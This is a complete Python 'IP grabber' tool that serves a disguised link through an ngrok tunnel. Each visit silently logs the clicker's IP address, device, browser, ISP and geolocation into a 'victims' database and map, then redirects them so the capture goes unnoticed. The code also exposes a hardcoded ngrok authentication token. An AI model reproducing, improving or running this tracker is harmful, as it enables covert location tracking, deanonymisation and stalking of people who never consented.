import os
import sqlite3
import subprocess
import time
import requests
import pyperclip
import folium
from flask import Flask, redirect, request, g
from datetime import datetime
from rich.console import Console
from rich.table import Table
from rich.prompt import Prompt
from ua_parser import user_agent_parser
from threading import Thread
import logging
import traceback

# ------------------- Configuration -------------------
console = Console()
app = Flask(__name__)

# Suppress all Flask/Werkzeug logging
log = logging.getLogger('werkzeug')
log.disabled = True
app.logger.disabled = True

# Ngrok Configuration
NGROK_PATH = r"C:\Users\Gonzalo\Desktop\Python 2024\reaver\ngrok.exe"
NGROK_API = "http://127.0.0.1:4040/api/tunnels"
NGROK_AUTH_TOKEN = "2vSGHGpvcx98xd7QZ3MejUn1YTU_5vYyVjiQizamfYb4cyb1W"

# Global map for victims
global_map = folium.Map(location=[40.7128, -74.0060], zoom_start=3)
MAP_FILENAME = "victims_map.html"

# ------------------- Utility Functions -------------------
def show_banner():
    """Displays the program banner"""
    banner = r"""
 ___  ___  ___  _ _  ___  ___   ___           _ 
| . \| __>| . || | || __>| . \ |_ _|___  ___ | |
|   /| _> |   || ' || _> |   /  | |/ . \/ . \| |
|_\_\|___>|_|_||__/ |___>|_\_\  |_|\___/\___/|_|
[+] Discord: gxnza.48
"""
    console.print(banner, style="bold purple")

def init_db():
    """Initializes SQLite database with proper schema"""
    try:
        conn = sqlite3.connect("victims.db")
        cursor = conn.cursor()
        
        # Check if table exists
        cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='victims'")
        if not cursor.fetchone():
            # Create new table with all columns
            cursor.execute("""
                CREATE TABLE victims (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    ip TEXT,
                    device TEXT,
                    os TEXT,
                    browser TEXT,
                    city TEXT,
                    region TEXT,
                    country TEXT,
                    isp TEXT,
                    latitude REAL,
                    longitude REAL,
                    timestamp TEXT
                )
            """)
        else:
            # Check and add missing columns
            cursor.execute("PRAGMA table_info(victims)")
            columns = [column[1] for column in cursor.fetchall()]
            if 'country' not in columns:
                cursor.execute("ALTER TABLE victims ADD COLUMN country TEXT")
            if 'isp' not in columns:
                cursor.execute("ALTER TABLE victims ADD COLUMN isp TEXT")
        
        conn.commit()
        conn.close()
    except Exception as e:
        console.print(f"[bold red][!] Database error: {str(e)}[/bold red]")

def save_victim(ip, device, os, browser, city, region, country, isp, lat, lon):
    """Saves victim data to database"""
    try:
        conn = sqlite3.connect("victims.db")
        cursor = conn.cursor()
        cursor.execute("""
            INSERT INTO victims (ip, device, os, browser, city, region, country, isp, latitude, longitude, timestamp)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (ip, device, os, browser, city, region, country, isp, lat, lon, datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
        conn.commit()
        conn.close()
    except Exception as e:
        console.print(f"[bold red][!] Error saving victim data: {str(e)}[/bold red]")

def get_location(ip):
    """Gets geolocation data using ip-api.com (free API)"""
    try:
        if ip.startswith(("127.", "192.168", "10.", "172.")):
            return ("Localhost", "Localhost", "Local", "Local", None, None)
        
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,isp,lat,lon", timeout=5)
        data = response.json()
        
        if data.get("status") == "success":
            return (
                data.get("city", "Unknown"),
                data.get("regionName", "Unknown"),
                data.get("country", "Unknown"),
                data.get("isp", "Unknown"),
                data.get("lat"),
                data.get("lon")
            )
    except Exception as e:
        console.print(f"[bold purple][!] Geolocation error: {str(e)}[/bold purple]")
    return ("Unknown", "Unknown", "Unknown", "Unknown", None, None)

def detect_device(user_agent_str):
    """Analyzes user agent string"""
    try:
        parsed_ua = user_agent_parser.Parse(user_agent_str)
        device = parsed_ua.get("device", {}).get("family", "Unknown")
        os = f"{parsed_ua.get('os', {}).get('family', 'Unknown')} {parsed_ua.get('os', {}).get('version', '')}".strip()
        browser = f"{parsed_ua.get('user_agent', {}).get('family', 'Unknown')} {parsed_ua.get('user_agent', {}).get('version', '')}".strip()
        
        if device == "Other":
            if "Mobile" in user_agent_str:
                device = "Mobile Device"
            elif "Windows" in user_agent_str:
                device = "Windows PC"
            elif "Macintosh" in user_agent_str:
                device = "Mac Computer"
        
        return device, os, browser
    except Exception as e:
        console.print(f"[bold purple][!] Device detection error: {str(e)}[/bold purple]")
        return "Unknown", "Unknown", "Unknown"

def update_geo_map(ip, city, region, lat, lon):
    """Updates the victims map"""
    try:
        if lat and lon:
            folium.Marker(
                location=[float(lat), float(lon)],
                popup=f"IP: {ip}\n{city} - {region}",
                icon=folium.Icon(color="red", icon="info-sign")
            ).add_to(global_map)
            global_map.save(MAP_FILENAME)
    except Exception as e:
        console.print(f"[bold purple][!] Map update error: {str(e)}[/bold purple]")

def start_ngrok():
    """Starts ngrok tunnel with proper error handling"""
    try:
        # Verify ngrok exists
        if not os.path.exists(NGROK_PATH):
            console.print("[bold red][!] Error: ngrok.exe not found at specified path[/bold red]")
            console.print(f"[purple]Please verify the file exists at: {NGROK_PATH}[/purple]")
            return None

        # Kill existing ngrok processes
        subprocess.run(["taskkill", "/f", "/im", "ngrok.exe"], 
                      stdout=subprocess.DEVNULL,
                      stderr=subprocess.DEVNULL,
                      shell=True)

        # Set auth token
        subprocess.run([NGROK_PATH, "config", "add-authtoken", NGROK_AUTH_TOKEN],
                      stdout=subprocess.DEVNULL,
                      stderr=subprocess.DEVNULL,
                      shell=True)

        # Start ngrok with proper suppression
        console.print("[bold purple][+] Starting ngrok tunnel (may take 10-20 seconds)...[/bold purple]")
        ngrok_process = subprocess.Popen(
            [NGROK_PATH, "http", "5000", "--log=stdout"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
            shell=True,
            text=True
        )
        
        # Wait for tunnel with timeout
        start_time = time.time()
        while time.time() - start_time < 30:  # 30 second timeout
            try:
                response = requests.get(NGROK_API, timeout=5)
                if response.status_code == 200:
                    tunnels = response.json().get("tunnels", [])
                    for tunnel in tunnels:
                        if tunnel.get("proto") == "https":
                            public_url = tunnel["public_url"]
                            console.print(f"[bold green][+] Ngrok active: [underline]{public_url}[/underline][/bold green]")
                            pyperclip.copy(public_url)
                            return public_url
            except requests.RequestException:
                pass
            time.sleep(2)

        console.print("[bold red][!] Ngrok failed to start (timeout)[/bold red]")
        ngrok_process.kill()
        return None

    except Exception as e:
        console.print(f"[bold red][!] Ngrok error: {str(e)}[/bold red]")
        return None

def display_victim_table(ip, device, os, browser, city, region, country, isp, timestamp):
    """Displays victim data in a formatted table"""
    try:
        table = Table(title="[bold magenta]VICTIM DETAILS[/bold magenta]", style="bright_cyan")
        table.add_column("Field", style="bold cyan")
        table.add_column("Value", style="bold green")
        
        table.add_row("IP Address", ip)
        table.add_row("Device", device)
        table.add_row("Operating System", os)
        table.add_row("Browser", browser)
        table.add_row("City", city)
        table.add_row("Region", region)
        table.add_row("Country", country)
        table.add_row("ISP", isp)
        table.add_row("Timestamp", timestamp)
        
        console.print(table)
    except Exception as e:
        console.print(f"[bold red][!] Error displaying table: {str(e)}[/bold red]")

def run_flask():
    """Runs Flask server silently"""
    # Remove problematic env vars
    os.environ.pop('WERKZEUG_SERVER_FD', None)
    os.environ.pop('WERKZEUG_RUN_MAIN', None)
    
    # Run with suppressed output
    with open(os.devnull, 'w') as f:
        app.run(
            host="0.0.0.0",
            port=5000,
            debug=False,
            use_reloader=False,
            threaded=True
        )

# ------------------- Flask Routes -------------------
@app.route('/')
def index():
    """Main route that captures data and redirects"""
    try:
        if not hasattr(g, 'redirect_url'):
            return "Service not ready", 503
        
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        user_agent_str = request.headers.get("User-Agent", "Unknown")
        device, os, browser = detect_device(user_agent_str)
        city, region, country, isp, lat, lon = get_location(ip)
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        save_victim(ip, device, os, browser, city, region, country, isp, lat, lon)
        display_victim_table(ip, device, os, browser, city, region, country, isp, timestamp)
        update_geo_map(ip, city, region, lat, lon)
        
        response = redirect(g.redirect_url, code=302)
        response.headers['ngrok-skip-browser-warning'] = 'true'
        return response
    
    except Exception as e:
        console.print(f"[bold red][!] Critical error in request handling: {str(e)}[/bold red]")
        console.print(traceback.format_exc())
        return "Internal Server Error", 500

# ------------------- Main Execution -------------------
def main():
    show_banner()
    init_db()
    
    redirect_url = Prompt.ask("[bold purple]Enter redirect URL (e.g. https://example.com)[/bold purple]")
    app.config['REDIRECT_URL'] = redirect_url
    
    @app.before_request
    def before_request():
        g.redirect_url = app.config['REDIRECT_URL']
    
    # Start Flask in background
    flask_thread = Thread(target=run_flask, daemon=True)
    flask_thread.start()
    time.sleep(2)  # Allow Flask to start
    
    # Start ngrok
    public_url = start_ngrok()
    
    if public_url:
        console.print(f"\n[bold green]Target URL: [underline]{public_url}[/underline][/bold green]")
        console.print(f"[bold blue]Victims map: {MAP_FILENAME}[/bold blue]\n")
    else:
        console.print("\n[bold purple]Local access only: http://localhost:5000[/bold purple]\n")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        console.print("\n[bold purple][+] Shutdown complete[/bold purple]")

if __name__ == '__main__':
    main()